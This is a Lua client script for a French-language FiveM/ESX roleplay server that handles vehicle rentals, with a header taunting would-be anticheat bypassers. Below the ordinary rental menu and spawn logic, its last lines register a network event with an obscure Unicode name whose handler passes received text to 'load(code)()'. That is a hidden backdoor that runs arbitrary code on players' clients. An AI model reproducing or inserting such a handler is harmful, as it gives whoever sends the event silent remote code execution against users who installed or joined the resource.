-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion
local spawned = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{ayzwen}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

Citizen.CreateThread(function()
	for i = 1, #Config.LocationsBlips, 1 do
		local blip = AddBlipForCoord(Config.LocationsBlips[i])

		SetBlipSprite(blip, 171)
		SetBlipDisplay(blip, 4)
		SetBlipScale(blip, 0.6)
		SetBlipColour(blip, 5)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName('STRING')
		AddTextComponentSubstringPlayerName('Location de véhicule')
		EndTextCommandSetBlipName(blip)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		for i = 1, #Config.Locations, 1 do
			local distance = #(GetEntityCoords(PlayerPedId(), false) - Config.Locations[i].coords)

			if distance < Config.DrawDistance then
				DrawMarker(Config.Locations[i].type, Config.Locations[i].coords, 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.Locations[i].size, Config.Locations[i].color.r, Config.Locations[i].color.g, Config.Locations[i].color.b, 100, false, true, 2, false, false, false, false)

				if distance < 1.95 then
					ESX.ShowHelpNotification('Appuyez sur ~INPUT_CONTEXT~ pour louer un véhicule')

					if IsControlJustReleased(0, 38) then
						showMenu(i)
					end
				end
			end
		end
	end
end)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if spawned then
            Citizen.Wait(120000)
            spawned = false
        end
    end
end)

function showMenu(location)
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_menu', {
		title = 'Location de véhicules',
		elements = Config.Options
	}, function(data, menu)
		menu.close()

		ESX.TriggerServerCallback('::{ayzwen}::esx_location:buy', function(hasEnoughMoney)
			if hasEnoughMoney then
                if spawned then
					ESX.ShowAdvancedNotification("Adastra", "~y~Location", "Vous avez déjà sortie un véhicule, veuillez attendre 2 minutes.", "CHAR_Adastra", 7, false, false, nil)
                else
                    spawned = true
                    ESX.Game.SpawnVehicle(data.current.value, Config.Locations[location].coords, Config.Locations[location].heading, function(vehicle)
                        local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('LOCA')
                        SetVehicleNumberPlateText(vehicle, newPlate)
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                        _TriggerServerEvent('::{ayzwen}::esx_vehiclelock:givekey', 'no', newPlate)
                    end)
				end
                else
                    ESX.ShowNotification('Vous n\'avez pas assez d\'argent sur vous.')
                end
		end, data.current.price)
	end, function(data, menu)
	end)
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)